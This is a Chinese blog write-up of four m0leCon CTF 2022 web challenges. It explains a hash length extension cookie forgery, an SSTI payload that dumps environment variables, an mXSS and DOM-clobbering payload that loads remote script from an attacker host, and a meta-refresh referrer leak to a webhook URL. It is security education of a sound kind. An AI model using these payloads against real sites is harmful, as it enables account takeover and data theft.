---
title: m0leCon CTF 2022 筆記
catalog: true
date: 2022-05-21 16:14:14
tags: [Security]
categories: [Security]
---

<img src="/img/m0lecon-ctf-2022-writeup/cover.png" style="display:none;">

原本想要寫得詳細一點再 po 的，但我發現如果要這樣的話，可能要過很久才會 po，所以還是趕快先寫一篇簡短版的。

這次寫的是以下四題，都是 web：

1. Fancy Notes
2. Dumb Forum
3. LESN
4. ptMD

先記幾個 keyword 以後比較容易找：

1. 長度擴充攻擊（Length extension attack）
2. SSTI
3. mutation XSS `<svg><style>`
4. `<meta name="referrer" content="unsafe-url" />`
5. `<meta http-equiv="refresh" content="3;url">`
6. Puppeteer 的 click 行為是抓取元素位置再點擊座標

<!-- more -->

## Fancy Notes

這題的核心程式碼如下：

```  py
def get_user():
    if not 'user' in request.cookies:
        return None

    cookie = base64.b64decode(request.cookies.get(
        'user')).decode('raw_unicode_escape')
    assert len(cookie.split('|')) == 2
    user_string = cookie.split('|')[0]
    signature_string = cookie.split('|')[1]

    if hashlib.sha256((SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest() != signature_string:
        print("nope")
        return None

    user = serialize_user(user_string)
    return user
```

會從 cookie 去斷你是哪一個 user，序列化跟反序列化的程式碼如下：

``` py
def serialize_user(user_string):
    user = dict()
    for kv in user_string.split(','):
        k = kv.split('=')[0]
        v = kv.split('=')[1]
        user[k] = v
    return user

def deserialize_user(user):
    values = []
    for k in ["username", "locale"]:
        values.append(f'{k}={user.__dict__[k]}')
    return ','.join(values)
```

而產生 cookie 的程式碼長這樣：

``` py
def generate_cookie(user):
    user_string = deserialize_user(user)
    signature_string = hashlib.sha256(
        (SECRET_KEY + user_string).encode('raw_unicode_escape')).hexdigest()
    cookie = base64.b64encode(
        (f'{user_string}|{signature_string}').encode('raw_unicode_escape')).decode()
    return cookie
```

目標是想辦法偽造成 admin 登入，就可以拿到 flag。

正常的狀況下，假設我們的 user 叫做 abc 好了，locale 是 en，產生出來的 user_string 就會是：`username=abc,locale=en`。

從 `serialize_user` 中可以看出前面的屬性會被後面蓋掉，所以如果我們的 user_string 是 `username=a,locale=en,username=admin`，還原回 user 時身份就會變成 admin。

在產生 cookie 時，後面有特別加上一個簽名（`sha256(secret + user_string)`）來驗證資料完整性。

所以在我們不知道 key 的狀況下，照理來說我們沒有辦法偽造 user_string，因為完整性的檢查過不了。

但是呢，這題用的這種驗證方式可以用一種叫做長度擴充攻擊（Length extension attack）的方式來打。

簡單來說呢，如果今天有一個操作是：`M1 = hash(secret + data)`，你只要知道 secret+data 的「長度」就好，不需要知道內容是什麼，以及產生出來的結果 M1，那你就可以在 `secret+data` 後面拼接任意字串，並且知道合法的 `hash(secret + data + padding + 任意 data)`

舉例來說，你今天知道 `"{secret}username=a"` 在 md5 過後會變成 `781e5e245d69b566979b86e28d23f2c7`，在不知道 secret 為何的狀況之下，你還是能知道 `"{secret}username=a{padding},username=admin"` 的 md5 是多少。

上面的 `{padding}`，這跟 hash 演算法的原理有關。

總之呢，透過這個攻擊方式，我們可以在不知道 secret 的狀況下把已知的字串延長並且產生出合法的 hash 值，就能繞過這題的檢查。

至於詳細的原理跟攻擊方式，先留幾篇參考文章，未來有機會再回來補這個坑：

1. [Everything you need to know about hash length extension attacks](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks)
2. [長度擴充攻擊 | Length Extension Attack (LEA)](https://maojui.me/Crypto/LEA/)
3. [Hash Length Extension Attacks](https://www.whitehatsec.com/blog/hash-length-extension-attacks/)
4. [Understanding the length extension attack](https://crypto.stackexchange.com/questions/3978/understanding-the-length-extension-attack)
5. [密码学系列之:Merkle–Damgård结构和长度延展攻击](http://www.flydean.com/md-length-extension/)
6. [哈希长度拓展攻击(Hash Length Extension Attacks)](https://xz.aliyun.com/t/2563)
7. [Length extension attack](https://ucgjhe.github.io/post/length_extension_attack/)

## Dumb Forum

這題有個 SSTI：

``` py
@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile():
    with open('app/templates/profile.html') as p:
        profile_html = p.read()
    
    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)

    if(current_user.about_me == None):
        current_user.about_me = ""
    return render_template_string(profile_html)
```

username 跟 aboutme 都有被檢查，不能用 `}{`，而 email 只有檢查是不是合法的 email 地址，是的話就能用。

因此 `abc｛{7*7}}@abc.com` 在界面上呈現的會是 `abc49@abc.com`，因為在這套 library 中 email 地址如果有 `()` 的話會被視為不合法，所以沒辦法用 `()`。

flag 在環境變數裡面，所以只要這樣就 win 了：

``` py
{{cycler.__init__.__globals__.os.environ}}@x.com
```

## LESN

這題可以建立一個 post，內容可以控制但會被 sanitized，最後會 render 成這樣：

``` ejs
<script src="/static/script.js" async></script>

<a style="position: absolute; left: 30%; top:5px" href="/">Home</a>
<a style="position: absolute; right: 30%; top:5px" href="/edit/<%= imgid %>">Edit</a>

<div style="margin-top: 3em;">
    <img src="<%= imgurl %>" onerror="setTimeout(redirect_error_image,1500)"
        style="max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;">

    <div style="margin-top: 30px; text-align: center;"><%- description %></div>
</div>


<%- include('footer') %>
```

過濾的程式碼長這樣：

``` js
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function my_sanitize(html) {
    const document = new JSDOM('').window.document
    document.body.outerHTML = html

    let node;
    const iter = document.createNodeIterator(document.body)

    while (node = iter.nextNode()) {
        if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) {
            node.parentNode.removeChild(node)
            continue
        }


        if (node.attributes) {
            for (let i = node.attributes.length - 1; i >= 0; i--) {
                const att = node.attributes[i]
                if (! /(class|src|style)/i.test(att.name)) {
                    node.removeAttributeNode(att)
                }
            }
        }
    }

    return document.body.innerHTML
}

function sanitize(html) {

    let clean = my_sanitize(html)

    clean = DOMPurify.sanitize(clean)

    return clean
}


module.exports = { sanitize }
```

最後有經過 DOMPurify，所以危險的 tag 都不能用。

這題的重點是我在看的時候，發現有時候 console 會出現 `redirect_error_image is undefined` 的錯誤。

這是因為 script 是用 async 來載入，所以有個 race condition 的問題。如果 img 的 `onerror` 在 script 載入前就被觸發，那 `redirect_error_image` 就會是 undefined。

利用這個特點，勝利方程式就是用 DOM clobbering 去控制 `redirect_error_image`，再加上 `setTimeout` 第一個參數傳字串就跟 `eval` 差不多的特性去執行任意程式碼。

DOM clobbering 的部分要先繞掉自訂的 parser，這部分由隊友完成，原理大概就是這篇：[HTML sanitization bypass in Ruby Sanitize < 5.2.1](https://research.securitum.com/html-sanitization-bypass-in-ruby-sanitize-5-2-1/) 講的，利用 namespace confusiion 來製造出 mXSS，payload 長這樣：

``` html
<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=http:pew>g
```

jsdom 會把上面的段落 parse 成這樣：

```
BODY
-> svg
---> style
------> #text: </style></svg><a id=redirect_error_image href=http:pew>g
```

就只是一個 style 有著內容，沒什麼，但是用 `document.body.innerHTML` 還原回去時會變成這樣：

``` html
<svg><style></style></svg><a id=redirect_error_image href=http:pew>g</style></svg>
```

就產生出了這個 `<a>` 的 tag，讓我們可以 DOM clobbering。而內容其實放個 `http:import(script)` 就好，`http:` 會被當作是 label，後面的程式碼會直接被執行。

接著就是要怎麼讓 onerror 發生的比腳本載入快，根據作者的 [writeup](https://github.com/xatophi/m0leconteaser2022-LESN/blob/main/writeup.md)，在圖片網址的部分可以放上 `http://localhost` 之類的網址，讓它趕快失敗，放 `http://not_exist` 感覺也行。

然後可以用 iframe 去載入你的 post，再把自訂頁面丟給 bot，就可以避免使用到 cached 的 `script.js`。

我那時是想說瀏覽器載入資源都有 priority，如果可以製造出一個 priority 比 script.js 還高的組合，就能延緩腳本的載入之類的，所以試著在頁面中加入一堆圖片：

``` html
<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')>
&lt;img src=https://deelay.me/20000/https://example.com>
&lt;img src=https://deelay.me/20001/https://example.com>
&lt;img src=https://deelay.me/20002/https://example.com>
&lt;img src=https://deelay.me/20003/https://example.com>
```

不過好像沒什麼用就是了，圖片順序應該也不會比 script 還高。當時也沒有繼續研究有哪些可以做到我理想中的狀況。

最後是想到之前 @lbrnli1234 在解我出的一題 XSS 時也碰到 race condition，它後來就塞了一堆 iframe 來增加成功機率，可見：[Notes XSS Challenge Author Writeup](https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/)

我也照著做，塞了一堆 iframe：

``` html
<!DOCTYPE html>
<html>
<head>
</head>
<body>

  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
</body>

</html>
```

最後就解掉了，first blood。

## ptMD

本次最難，全場一解。

先附上作者 wirteup：https://github.com/xatophi/m0leconteaser2022-ptMD/blob/main/writeup.md

簡單來說你有個頁面，你可以插入任意 HTML，但是 CSP 是 `script-src 'self'`，所以沒辦法 XSS。

目標是偷到 admin note 的內容，由於網址是唯一的而且沒有權限管理，所以偷到網址其實就行了。在 client 的頁面有個 `last` 可以點，點下去之後就會到最新的 note 頁面去。

這邊因為是用 react 做的，所以如果你直接把網址設定成 `/last` 是沒用的，因為剛載入的時候 notes 是空的，所以並不會重新導向到最新的 note 去。

這題的 admin bot 長這樣：

``` js
async function visit(url) {
    const browser = await puppeteer.launch({
        headless: true,
        args: [
            '--disable-default-apps',
            '--disable-extensions',
            '--disable-gpu',
            '--disable-sync',
            '--disable-translate',
            '--hide-scrollbars',
            '--metrics-recording-only',
            '--mute-audio',
            '--no-first-run',
            '--no-sandbox',
            '--safebrowsing-disable-auto-update'
        ],
        executablePath: '/usr/bin/chromium'
    })


    try {
        let page = await browser.newPage()

        //login
        await page.goto(LOGIN_URL)

        await page.waitForSelector('#username')
        await page.focus('#username')
        await page.keyboard.type('admin', { delay: 10 })
        await page.focus('#password')
        await page.keyboard.type(ADMIN_PASSWORD, { delay: 10 })

        await new Promise(resolve => setTimeout(resolve, 300))
        await page.click('#submit')
        await new Promise(resolve => setTimeout(resolve, 300))

        //await page.waitForNavigation({ waitUntil: 'networkidle2' })
        console.log(await page.cookies())

        // visit URL after auth
        await page.goto(url, { timeout: 5000 })
        await new Promise(resolve => setTimeout(resolve, 2000))

        // logout
        await page.click('#logout')
        await new Promise(resolve => setTimeout(resolve, 2000))

        // close browser
        await page.close()
        await browser.close()
    } catch (e) {
        console.log(e)
        await browser.close()
        //throw (e)
    }

}
```

最後一步我在看的時候就覺得怪怪的，就是去點擊那個 logout button，我就在想為什麼要點那個，賽後才知道那也是關鍵之一。

我在解的時候有想到可能跟 referrer policy 有關，但用了 `<iframe referrerPolicy="unsafe-url"></iframe>` 似乎沒有效果。

解答確實跟這個有關，但是是這樣的：

``` html
<meta name="referrer" content="unsafe-url" />
<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
```

用 `<meta>` 來設置 referrer，然後再用 `meta refresh` 設定三秒後把頁面重新導向。

然後再用 CSS 把 logout button 的位置藏到 `last` button 後面，這樣 admin bot 實際上就會點到 `last` button，跳到 note 頁面，接著靠著 referrer policy 就可以 leak 出 URL。

最後這個答案打破了三件我以為的認知：

1. 我以為 meta 要放在 head 裡面才有效
2. 我以為 meta tag 被清掉之後就沒效了
3. 我以為 puppeteer 點按鈕的時候跟畫面無關，而是會直接點到元素

針對這三件事情，我們都可以來做一個小實驗。

第一點我做了一個簡單的網頁：

``` html
<!DOCTYPE html>
<html>

<head>
  <meta charset='utf-8'>
</head>
<body>
  <h1>test</h1>
  <meta name="referrer" content="unsafe-url" />
  <meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src https://*; child-src 'none';">
  <meta http-equiv="refresh" content="3;url=http://example.org" />    

</body>

<body>
```

打開後在 cosnole 看到錯誤：

> The Content Security Policy 'default-src 'self'; img-src https://*; child-src 'none';' was delivered via a <meta> element outside the document's <head>, which is disallowed. The policy has been ignored.

不過，過了三秒之後確實有重新導向。所以只有 CSP header 一定要放在 head，其他放在 body 也可以。


第二點改一下網頁即可：

``` html
<!DOCTYPE html>
<html>

<head>
  <meta charset='utf-8'>
</head>
<body>
  <h1>test</h1>
  <meta name="referrer" content="unsafe-url" />
  <meta http-equiv="refresh" content="3;url=http://example.org" />    
  <script>
    [...document.querySelectorAll('meta')].forEach(item => item.remove())
    alert(document.body.innerHTML)
  </script>
</body>

<body>
```

可以看到雖然 meta 確實被移除掉，不過 3 秒後還是重新導向了，所以效果還在，原來真的這麼神奇。

第三點其實文件有寫到 [page
.click
(selector[, options])](https://pptr.dev/#?product=Puppeteer&version=v14.1.0&show=api-pageclickselector-options)

> This method fetches an element with selector, scrolls it into view if needed, and then uses page.mouse to click in the center of the element. If there's no element matching selector, the method throws an error.

去翻 source code 的話也可以看到：[src/common/JSHandle.ts](https://github.com/puppeteer/puppeteer/blob/84fc4227a4543724ba3841f35183f0081751f9a8/src/common/JSHandle.ts#L696)

``` js
/**
 * This method scrolls element into view if needed, and then
 * uses {@link Page.mouse} to click in the center of the element.
 * If the element is detached from DOM, the method throws an error.
 */
async click(options: ClickOptions = {}): Promise<void> {
  await this._scrollIntoViewIfNeeded();
  const { x, y } = await this.clickablePoint(options.offset);
  await this._page.mouse.click(x, y, options);
}
```

這邊其實只是用 `_page.mouse.click` 去點擊一個指定的座標而已。所以如果有元素蓋在上面，就會點到蓋在上面的元素。

真的是學習了。







